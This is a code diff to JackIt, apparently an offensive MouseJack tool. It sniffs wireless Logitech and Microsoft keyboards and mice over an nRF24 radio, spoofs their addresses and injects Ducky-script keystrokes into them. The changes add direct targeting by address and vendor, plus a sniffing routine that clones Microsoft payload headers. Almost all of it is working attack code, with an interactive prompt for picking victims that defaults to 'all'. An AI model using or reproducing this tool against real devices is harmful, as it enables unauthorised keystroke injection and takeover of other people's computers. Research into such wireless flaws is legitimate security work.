@@ -212,20 +212,14 @@ class JackIt(object):
             self.radio.enable_lna()
 
     def scan(self, timeout=5.0):
-        # Put the radio in promiscuous mode
         self.radio.enter_promiscuous_mode('')
-        dwell_time = 0.1
-
-        # Set the initial channel
         self.radio.set_channel(self.channels[self.channel_index])
-
-        # Sweep through the self.channels and decode ESB packets in pseudo-promiscuous mode
+        dwell_time = 0.1
         last_tune = time.time()
-        total_time = time.time()
+        start_time = time.time()
 
         try:
-            while time.time() - total_time < timeout:
-
+            while time.time() - start_time < timeout:
                 if len(self.channels) > 1 and time.time() - last_tune > dwell_time:
                     self.channel_index = (self.channel_index + 1) % (len(self.channels))
                     self.radio.set_channel(self.channels[self.channel_index])
@@ -256,8 +250,60 @@ class JackIt(object):
             exit(-1)
         return self.devices
 
-    def sniff(self, address):
-        self.radio.enter_sniffer_mode(''.join(chr(b) for b in address[::-1]))
+    def sniff(self, timeout, address):
+        self.radio.enter_sniffer_mode(self.serialize_address(address))
+        self.radio.set_channel(self.channels[self.channel_index])
+        dwell_time = 0.1
+        ping = '0F:0F:0F:0F'.replace(':', '').decode('hex')
+        addr_string = self.hexify(address)
+        last_ping = time.time()
+        start_time = time.time()
+
+        try:
+            while time.time() - start_time < timeout:
+                if len(self.channels) > 1 and time.time() - last_ping > dwell_time:
+                    if not self.radio.transmit_payload(self.serialize_payload(ping), 1, 1):
+                        success = False
+                        for self.channel_index in range(len(self.channels)):
+                            self.radio.set_channel(self.channels[self.channel_index])
+                            if self.radio.transmit_payload(self.serialize_payload(ping), 1, 1):
+                                last_ping = time.time()
+                                success = True
+                                self._debug("Ping success on channel %d" % self.channels[self.channel_index])
+                                break
+
+                        if not success:
+                            self._debug("Ping failed")
+                    else:
+                        last_ping = time.time()
+
+                value = self.radio.receive_payload()
+                if value[0] == 0:
+                    last_ping = time.time()
+                    payload = value[1:]
+                    self._debug("ch: %02d addr: %s packet: %s" % (self.channels[self.channel_index], addr_string, self.hexify(payload)))
+
+                    if addr_string in self.devices:
+                        self.devices[addr_string]['count'] += 1
+                        self.devices[addr_string]['timestamp'] = time.time()
+                        if not self.channels[self.channel_index] in self.devices[addr_string]['channels']:
+                            self.devices[addr_string]['channels'].append(self.channels[self.channel_index])
+                        if payload and self.fingerprint_device(payload):
+                            self.devices[addr_string]['device'] = self.fingerprint_device(payload)
+                            self.devices[addr_string]['payload'] = payload
+                    else:
+                        self.devices[addr_string] = {'address': address, 'channels': [self.channels[self.channel_index]], 'count': 1, 'payload': payload, 'device': ''}
+                        self.devices[addr_string]['timestamp'] = time.time()
+                        if payload and self.fingerprint_device(payload):
+                            self.devices[addr_string]['device'] = self.fingerprint_device(payload)
+
+        except RuntimeError:
+            print R + '[!] ' + W + 'Runtime error while sniffing'
+            exit(-1)
+        return self.devices
+
+    def sniffer_mode(self, address):
+        self.radio.enter_sniffer_mode(self.serialize_address(address))
 
     def find_channel(self, address):
         ping = '0F:0F:0F:0F'.replace(':', '').decode('hex')
@@ -464,22 +510,34 @@ def confirmroot():
 
 
 @click.command()
-@click.option('--debug', is_flag=True, help='Enable debug.')
+@click.option('--debug', is_flag=True, help='Enable debug')
 @click.option('--script', default="", help="Ducky file to use for injection", type=click.Path())
 @click.option('--lowpower', is_flag=True, help="Disable LNA on CrazyPA")
 @click.option('--interval', default=5, help="Interval of scan in seconds, default to 5s")
 @click.option('--layout', default='us', help="Keyboard layout: %s" % ", ".join(keymap.mapping.keys()))
-def cli(debug, script, lowpower, interval, layout):
+@click.option('--address', default="", help="Address of device to target attack")
+@click.option('--vendor', default="", help="Vendor of device to target (required when specifying address)")
+def cli(debug, script, lowpower, interval, layout, address, vendor):
 
     banner()
     confirmroot()
 
     if debug:
-        print O + "[W] " + W + "Debug is enabled"
+        print O + "[W] " + W + "Debug is enabled."
 
     if not layout in keymap.mapping.keys():
         print R + '[!] ' + W + "Invalid keyboard layout selected."
         exit(-1)
+
+    if address and not vendor:
+        print R + '[!] ' + W + "Please use --vendor option to specify either Logitech or Microsoft."
+        exit(-1)
+
+    if vendor:
+        vendor = vendor.lower()
+        if not vendor.startswith("l") and not vendor.startswith("m"):
+            print R + '[!] ' + W + "Unknown vendor: specify either Microsoft of Logitech."
+            exit(-1)
 
     if script == "":
         print R + '[!] ' + W + "You must supply a ducky script using --script <filename>"
@@ -499,102 +557,122 @@ def cli(debug, script, lowpower, interval, layout):
             print R + "[!] " + W + "Please make sure you have it preloaded with the mousejack firmware."
             exit(-1)
 
-    print G + "[+] " + W + 'Scanning...'
+    addr = []
+    addr_string = ''
+    if address:
+        addr_string = address[:]
+        addr = [int(b, 16) for b in address.split(':')]
 
-    # Enter main loop
     try:
-        try:
-            while True:
-                devices = jack.scan(interval)
+        # If it's a logitech, we don't need a sample frame, so just attack
+        if addr and vendor and vendor.startswith("l"):
+            channel = 0
+            print GR + "[+] " + W + "Scanning for Logitech device %s, CTRL-C to cancel." % addr_string
+            while not channel:
+                channel = jack.find_channel(addr)
+            print G + "[+] " + W + "Device %s found on channel %d. Launching attack." % (addr_string, channel)
+            hid = LogitechHID(addr, [])
+            jack.attack(hid, attack)
+            print G + "[+] " + W + "Done."
+        else:
+            print G + "[+] " + W + 'Scanning...'
+            try:
+                # Enter main loop
+                while True:
+                    if addr and vendor and vendor.startswith("m"):
+                        # For MS devices, we need a sample frame to clone the payload header
+                        devices = jack.sniff(interval, addr)
+                    else:
+                        devices = jack.scan(interval)
 
-                click.clear()
-                print GR + "[+] " + W + ("Scanning every %ds " % interval) + G + "CTRL-C " + W + "when ready."
+                    click.clear()
+                    print GR + "[+] " + W + ("Scanning every %ds " % interval) + G + "CTRL-C " + W + "when ready."
+                    print ""
+
+                    idx = 0
+                    pretty_devices = []
+                    for key, device in devices.iteritems():
+                        idx = idx + 1
+                        pretty_devices.append([
+                            idx,
+                            key,
+                            ",".join(str(x) for x in device['channels']),
+                            device['count'],
+                            str(datetime.timedelta(seconds=int(time.time() - device['timestamp']))) + ' ago',
+                            device['device'],
+                            jack.hexify(device['payload'])
+                        ])
+
+                    print tabulate.tabulate(pretty_devices, headers=["KEY", "ADDRESS", "CHANNELS", "COUNT", "SEEN", "TYPE", "PACKET"])
+            except KeyboardInterrupt:
                 print ""
 
-                idx = 0
-                pretty_devices = []
-                for key, device in devices.iteritems():
-                    idx = idx + 1
-                    pretty_devices.append([
-                        idx,
-                        key,
-                        ",".join(str(x) for x in device['channels']),
-                        device['count'],
-                        str(datetime.timedelta(seconds=int(time.time() - device['timestamp']))) + ' ago',
-                        device['device'],
-                        jack.hexify(device['payload'])
-                    ])
+            if 'devices' not in locals() or len(devices) == 0:
+                print R + "[!] " + W + "No devices found please try again..."
+                exit(-1)
 
-                print tabulate.tabulate(pretty_devices, headers=["KEY", "ADDRESS", "CHANNELS", "COUNT", "SEEN", "TYPE", "PACKET"])
-        except KeyboardInterrupt:
-            print ""
+            if attack == "":
+                print R + "[!] " + W + "No attack script was provided..."
+                exit(-1)
 
-        if 'devices' not in locals() or len(devices) == 0:
-            print R + "[!] " + W + "No devices found please try again..."
-            exit(-1)
+            print GR + "\n[+] " + W + "Select " + G + "target keys" + W + " (" + G + "1-%s)" % (str(len(devices)) + W) + \
+                " separated by commas, or '%s': " % (G + 'all' + W),
+            value = click.prompt('', default="all")
+            value = value.strip().lower()
 
-        if attack == "":
-            print R + "[!] " + W + "No attack script was provided..."
-            exit(-1)
-
-        print GR + "\n[+] " + W + "Select " + G + "target keys" + W + " (" + G + "1-%s)" % (str(len(devices)) + W) + \
-            " separated by commas, or '%s': " % (G + 'all' + W),
-        value = click.prompt('', default="all")
-        value = value.strip().lower()
-
-        if value == "all":
-            victims = pretty_devices[:]
-        else:
-            victims = []
-            for vic in value.split(","):
-                if int(vic) <= len(pretty_devices):
-                    victims.append(pretty_devices[(int(vic)-1)])
-                else:
-                    print R + "[!] " + W + ("Device %d key is out of range" % int(vic))
-
-        targets = []
-        for victim in victims:
-            if victim[1] in devices:
-                targets.append(devices[victim[1]])
-
-        for target in targets:
-            payload = target['payload']
-            channels = target['channels']
-            address = target['address']
-            device_type = target['device']
-
-            # Sniffer mode allows us to spoof the address
-            jack.sniff(address)
-            hid = None
-            # Figure out what we've got
-            device_type = jack.fingerprint_device(payload)
-            if device_type == 'Microsoft HID':
-                hid = MicrosoftHID(address, payload)
-            elif device_type == 'MS Encrypted HID':
-                hid = MicrosoftEncHID(address, payload)
-            elif device_type == 'Logitech HID':
-                hid = LogitechHID(address, payload)
-
-            if hid:
-                # Attempt to ping the devices to find the current channel
-                lock_channel = jack.find_channel(address)
-
-                if lock_channel:
-                    print GR + '[+] ' + W + 'Ping success on channel %d' % (lock_channel,)
-                    print GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), device_type, lock_channel)
-                    jack.attack(hid, attack)
-                else:
-                    # If our pings fail, go full hail mary
-                    print R + '[-] ' + W + 'Ping failed, trying all channels'
-                    for channel in channels:
-                        jack.set_channel(channel)
-                        print GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), device_type, channel)
-                        jack.attack(hid, attack)
+            if value == "all":
+                victims = pretty_devices[:]
             else:
-                print R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (jack.hexify(address))
-                continue
+                victims = []
+                for vic in value.split(","):
+                    if int(vic) <= len(pretty_devices):
+                        victims.append(pretty_devices[(int(vic)-1)])
+                    else:
+                        print R + "[!] " + W + ("Device %d key is out of range" % int(vic))
 
-        print GR + '\n[+] ' + W + "All attacks completed\n"
+            targets = []
+            for victim in victims:
+                if victim[1] in devices:
+                    targets.append(devices[victim[1]])
+
+            for target in targets:
+                payload = target['payload']
+                channels = target['channels']
+                address = target['address']
+                device_type = target['device']
+
+                # Sniffer mode allows us to spoof the address
+                jack.sniffer_mode(address)
+                hid = None
+                # Figure out what we've got
+                device_type = jack.fingerprint_device(payload)
+                if device_type == 'Microsoft HID':
+                    hid = MicrosoftHID(address, payload)
+                elif device_type == 'MS Encrypted HID':
+                    hid = MicrosoftEncHID(address, payload)
+                elif device_type == 'Logitech HID':
+                    hid = LogitechHID(address, payload)
+
+                if hid:
+                    # Attempt to ping the devices to find the current channel
+                    lock_channel = jack.find_channel(address)
+
+                    if lock_channel:
+                        print GR + '[+] ' + W + 'Ping success on channel %d' % (lock_channel,)
+                        print GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), device_type, lock_channel)
+                        jack.attack(hid, attack)
+                    else:
+                        # If our pings fail, go full hail mary
+                        print R + '[-] ' + W + 'Ping failed, trying all channels'
+                        for channel in channels:
+                            jack.set_channel(channel)
+                            print GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), device_type, channel)
+                            jack.attack(hid, attack)
+                else:
+                    print R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (jack.hexify(address))
+                    continue
+
+            print GR + '\n[+] ' + W + "All attacks completed\n"
 
     except KeyboardInterrupt:
         print '\n ' + R + '(^C)' + O + ' interrupted\n'
